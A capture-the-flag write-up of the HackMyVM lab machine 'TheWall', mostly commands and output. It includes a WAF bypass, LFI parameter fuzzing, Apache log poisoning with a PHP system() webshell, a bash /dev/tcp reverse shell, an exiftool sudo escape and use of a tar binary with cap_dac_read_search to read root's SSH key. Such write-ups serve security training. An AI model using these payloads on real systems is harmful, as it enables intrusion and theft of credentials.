# TheWall

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| TheWall | claor | Beginner | HackMyVM |

**Summary:** TheWall presents a layered exploitation chain that begins with circumventing a Web Application Firewall through User-Agent spoofing before content discovery can even begin. Once a legitimate browser identity is assumed, directory enumeration exposes `includes.php`, a script containing a Local File Inclusion vulnerability hidden behind an obscure parameter name (`display_page`) that must be uncovered through targeted parameter fuzzing. The LFI is then weaponized into Remote Code Execution through classic Apache access log poisoning: a PHP one-liner is injected into the server's logs via a crafted `User-Agent` header, and the LFI is subsequently used to include that poisoned log file, triggering code execution as `www-data`. After stabilizing the reverse shell, a `sudo` misconfiguration reveals that `www-data` is permitted to execute `/usr/bin/exiftool` as the user `john` without a password. Leveraging the GTFOBins-documented `exiftool` Perl config inheritance technique, a malicious configuration file is passed via the `-config` flag, spawning a bash shell as `john`. The final privilege escalation exploits a Linux capability assigned to `/usr/sbin/tar`: `cap_dac_read_search=ep`, which allows the binary to bypass Discretionary Access Control and read any file on the system regardless of ownership or permissions. Root's private SSH key, stored unconventionally at `/id_rsa` on the filesystem root, is archived and extracted using this privileged `tar` binary, enabling direct SSH authentication as root and full system compromise.

---

## Reconnaissance

### Network Discovery

The engagement began with a local network sweep to identify the target host within the `192.168.100.0/24` subnet.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.152 08:00:27:73:C1:0D VirtualBox
```

The target was identified at `192.168.100.152`. A full port scan with service and version detection was then launched against the host.

### Port Scan

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ nmap -sC -sV -p- -T4 192.168.100.152
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 07:45 WIB
Nmap scan report for 192.168.100.152
Host is up (0.0040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 89:60:29:db:68:6d:13:34:98:b9:d0:17:24:56:a8:9e (RSA)
|   256 66:58:51:6d:cd:3a:67:46:36:56:9a:31:a0:08:13:cf (ECDSA)
|_  256 f7:34:9e:53:68:ba:c2:06:ab:14:c3:21:90:2d:6e:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds
```

The scan returned two open ports: SSH on port 22 running OpenSSH 8.4p1, and an Apache 2.4.54 web server on port 80. Attention shifted to the HTTP service first.

---

## Web Application Analysis

### WAF Detection and Bypass

A basic `curl` request against the web root initially returned a simple `200 OK` response with `<h1>HELLO WORLD!</h1>`. However, making requests in rapid succession or with a non-browser User-Agent triggered a `403 Forbidden` response, revealing the presence of a Web Application Firewall.

**First request (succeeds):**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Sun, 08 Mar 2026 07:46:42 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 25
Content-Type: text/html; charset=UTF-8


<h1>HELLO WORLD!</h1>
```

**Second request shortly after (blocked by WAF):**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -i $url
HTTP/1.0 403 Forbidden
Date: Sun, 08 Mar 2026 07:48:56 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 18
Connection: close
Content-Type: text/html; charset=UTF-8

<h1>Forbidden</h1>
```

**Bypass using a legitimate Chrome User-Agent:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" $url
HTTP/1.1 200 OK
Date: Sun, 08 Mar 2026 07:49:45 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 25
Content-Type: text/html; charset=UTF-8


<h1>HELLO WORLD!</h1>
```

With the WAF bypass confirmed, all subsequent requests carried a spoofed browser User-Agent. Directory and file fuzzing was then performed with deliberate throttling (`-t 3 -p 1`) to avoid triggering the rate-based blocking mechanism.

### Directory and File Enumeration

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ ffuf -u $url/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" -t 3 -p 1 -fs 18 -ic -e .php

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.152/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 3
 :: Delay            : 1.00 seconds
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 18
________________________________________________

includes.php            [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 3ms]
index.php               [Status: 200, Size: 25, Words: 2, Lines: 3, Duration: 4ms]
index.php               [Status: 200, Size: 25, Words: 2, Lines: 3, Duration: 3ms]
:: Progress: [4469/9500] :: Job [1/1] :: 3 req/sec :: Duration: [0:24:59] :: Errors: 0 ::
```

Two PHP files were discovered: `index.php` (the main page returning the `HELLO WORLD` response) and `includes.php`, which returned only 2 bytes of content with no visible output. The near-empty response of `includes.php` was a strong indicator of a file-inclusion script awaiting a parameter.

### Parameter Fuzzing for Local File Inclusion

To identify the hidden parameter name, `ffuf` was used to fuzz the query string of `includes.php`, testing each wordlist entry as a parameter key with `/etc/passwd` as the value. Any response that differed in size from the baseline 2-byte empty response would indicate a match.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ ffuf -ic -u "http://192.168.100.152/includes.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" -fs 2
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.152/includes.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2
________________________________________________

display_page            [Status: 200, Size: 1460, Words: 15, Lines: 29, Duration: 13ms]
```

The parameter `display_page` was the key. The response size jumped to 1460 bytes, corresponding precisely to the contents of `/etc/passwd`.

---

## Initial Access

### Local File Inclusion Confirmation

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" "$url/includes.php?display_page=/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
```

The LFI was fully confirmed, and the system user `john` (UID 1000) was identified as the only non-system interactive account.

### Apache Log Poisoning

The next step was to verify that the Apache access log was readable through the LFI, which would allow injecting PHP code directly into the log file via a crafted User-Agent string.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -s -A "Mozilla/5.0" "$url/includes.php?display_page=/var/log/apache2/access.log" > log

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ tail -n 20 log
::1 - - [08/Mar/2026:08:09:59 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:00 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:01 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:02 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:03 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:04 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:05 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:06 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:07 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:08 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
192.168.100.1 - - [08/Mar/2026:08:10:09 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
::1 - - [08/Mar/2026:08:10:09 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:10 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:11 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:12 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:13 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:14 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
::1 - - [08/Mar/2026:08:10:15 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) (internal dummy connection)"
192.168.100.1 - - [08/Mar/2026:08:10:42 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 15592064 "-" "Mozilla/5.0"
192.168.100.1 - - [08/Mar/2026:08:11:45 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 110048 "-" "Mozilla/5.0"
```

The access log was readable and, crucially, our own requests were visible in it, including the User-Agent strings we supplied. This confirmed the log poisoning vector. A PHP command-execution stub was injected into the log by sending it as a User-Agent header, and then the LFI was triggered with a `cmd` parameter to execute system commands.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -s -A "<?php system(\$_GET['cmd']); ?>" "$url/poison_test"
<h1>Not Found</h1>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -s -A "Mozilla/5.0" "$url/includes.php?display_page=/var/log/apache2/access.log&cmd=id" | grep "uid="
192.168.100.1 - - [08/Mar/2026:08:00:09 -0400] "GET /includes.php?squid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:00:34 -0400] "GET /includes.php?suid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:00:52 -0400] "GET /includes.php?fluid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:01:22 -0400] "GET /includes.php?uuid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:02:17 -0400] "GET /includes.php?resolveuid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:02:25 -0400] "GET /includes.php?uid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:02:44 -0400] "GET /includes.php?liquid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:03:44 -0400] "GET /includes.php?setuid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:04:36 -0400] "GET /includes.php?druid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:04:50 -0400] "GET /includes.php?F-Liquid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:05:08 -0400] "GET /includes.php?power_squid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:06:06 -0400] "GET /includes.php?guid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:06:18 -0400] "GET /includes.php?Squid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:06:33 -0400] "GET /includes.php?MissingGuid=/etc/passwd HTTP/1.1" 200 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
192.168.100.1 - - [08/Mar/2026:08:13:00 -0400] "GET /poison_test HTTP/1.1" 404 192 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output of `id` appeared inline in the log output, confirming arbitrary command execution as `www-data`. The log also exposed the parameter-fuzzing history from earlier in the session.

### Reverse Shell

With RCE confirmed, a netcat listener was started, and the log poisoning webshell was used to send a bash reverse shell back.

1. Start the listener on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

2. Trigger the reverse shell through the poisoned log:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ curl -s -A "Mozilla/5.0" "$url/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.1/4444+0>%261'" > log2
```

3. Catch the connection and stabilize the TTY using `/usr/bin/script` (as `python3` was unavailable):

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63360
bash: cannot set terminal process group (487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheWall:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: python3: command not found
www-data@TheWall:/var/www/html$ which python3
which python3
www-data@TheWall:/var/www/html$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
www-data@TheWall:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thewall]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@TheWall:/var/www/html$ export SHELL=/bin/bash
www-data@TheWall:/var/www/html$ export TERM=xterm-256color
www-data@TheWall:/var/www/html$ stty rows 54 cols 78
```

A fully interactive TTY was established as `www-data`.

---

## Lateral Movement: www-data to john

### Sudo Enumeration

With a shell on the system, sudo permissions were checked immediately.

```bash
www-data@TheWall:/var/www/html$ sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
```

The `www-data` user was permitted to run `/usr/bin/exiftool` as `john` without any password. ExifTool is a Perl-based metadata tool, and as documented on GTFOBins, it can be abused via its `-config` flag to load an arbitrary Perl configuration file that inherits and executes shell commands.

![](image.png)

### ExifTool Config Exploitation

The GTFOBins entry confirms that when `exiftool` runs under `sudo`, the acquired privileges are not dropped. By writing a Perl one-liner into a temporary config file and passing it via `-config`, arbitrary code runs as the target user.

```bash
www-data@TheWall:/var/www/html$ echo 'eval(exec("/bin/bash"))' > /tmp/pwn.config
www-data@TheWall:/var/www/html$ sudo -u john /usr/bin/exiftool -config /tmp/pwn.config
john@TheWall:/var/www/html$ cd
john@TheWall:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(bluetooth)
```

A bash shell was spawned as `john`. The home directory listing confirmed a `user.txt` flag file was present.

```bash
www-data@TheWall:/var/www/html$ ls -la /home/*
total 32
drwxr-xr-x 4 john john 4096 Oct 19  2022 .
drwxr-xr-x 3 root root 4096 Oct 17  2022 ..
lrwxrwxrwx 1 john john    9 Oct 19  2022 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Oct 17  2022 .bash_logout
-rw-r--r-- 1 john john 3526 Oct 17  2022 .bashrc
drwxr-xr-x 3 john john 4096 Oct 19  2022 .local
-rw-r--r-- 1 john john  807 Oct 17  2022 .profile
drwx------ 2 john john 4096 Oct 19  2022 .ssh
-rw-r--r-- 1 john john   33 Oct 19  2022 user.txt
```

---

## Privilege Escalation: john to root

### Linux Capabilities Enumeration

As `john`, the system was enumerated for Linux capabilities assigned to binaries, which can grant powerful permissions outside the standard SUID/SGID model.

```bash
john@TheWall:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

The capability `cap_dac_read_search=ep` on `/usr/sbin/tar` is particularly dangerous. This capability allows a process to bypass all `read` permission checks and directory search permission checks, meaning `tar` can archive and expose any file on the system regardless of its ownership or permissions, including files owned by root with mode `600`.

### Extracting Root's Private SSH Key

Inspecting the filesystem root revealed an unusual discovery: root's private SSH key was stored directly at `/id_rsa` with mode `600`, inaccessible to normal users.

```bash
john@TheWall:/$ ls -la
total 76
drwxr-xr-x  18 root root  4096 Oct 19  2022 .
drwxr-xr-x  18 root root  4096 Oct 19  2022 ..
lrwxrwxrwx   1 root root     7 Oct 17  2022 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Oct 17  2022 boot
drwxr-xr-x  17 root root  3160 Mar  8 03:42 dev
drwxr-xr-x  72 root root  4096 Oct 19  2022 etc
drwxr-xr-x   3 root root  4096 Oct 17  2022 home
-rw-------   1 root root  2602 Oct 19  2022 id_rsa
-rw-r--r--   1 root root   566 Oct 19  2022 id_rsa.pub
```

The privileged `tar` binary was used to archive the key file, bypassing the DAC restrictions, and then extract it into john's home directory where it could be read.

```bash
john@TheWall:~$ /usr/sbin/tar -cvf root_key.tar /id_rsa
/usr/sbin/tar: Removing leading `/' from member names
/id_rsa
john@TheWall:~$ tar -xvf root_key.tar
id_rsa
john@TheWall:~$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
..............................[REDACTED]..............................
kwidXsel+Zgj8AAAAMcm9vdEBUaGVXYWxsAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### SSH Authentication as Root and Flag Capture

With the private key in hand, SSH authentication as root was completed against localhost.

```bash
john@TheWall:~$ ssh -i id_rsa root@localhost
...
root@TheWall:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
TheWall
root@TheWall:~# cat /home/john/user.txt /root/r0Ot.txT
cc5[REDACTED]
4be[REDACTED]
```

Both flags were captured. Full root access was achieved.

---

## Attack Chain Summary

1. **Reconnaissance**: A network sweep located the target at `192.168.100.152`. Nmap revealed two services: SSH on port 22 and Apache HTTP on port 80.

2. **Vulnerability Discovery**: The web server was protected by a WAF that blocked automated-looking User-Agents and rapid requests. Spoofing a Chrome browser identity bypassed this control. Subsequent directory fuzzing with throttling discovered `includes.php`, and parameter fuzzing revealed the `display_page` LFI parameter.

3. **Exploitation**: The LFI was escalated to Remote Code Execution through Apache log poisoning. A PHP command execution one-liner was injected via a crafted User-Agent header, and the LFI was used to include the poisoned log file, achieving code execution as `www-data`. A bash reverse shell provided interactive access.

4. **Internal Enumeration**: The `sudo -l` command revealed that `www-data` could execute `/usr/bin/exiftool` as `john` without a password. GTFOBins documented the `-config` flag abuse that allowed arbitrary Perl execution under the target user's context.

5. **Privilege Escalation**: As `john`, capability enumeration identified `cap_dac_read_search=ep` on `/usr/sbin/tar`, enabling it to read any file regardless of permissions. Root's private SSH key, stored at the unconventional path `/id_rsa`, was archived and extracted using this privileged binary. The key was then used to authenticate via SSH as root, yielding full system compromise.
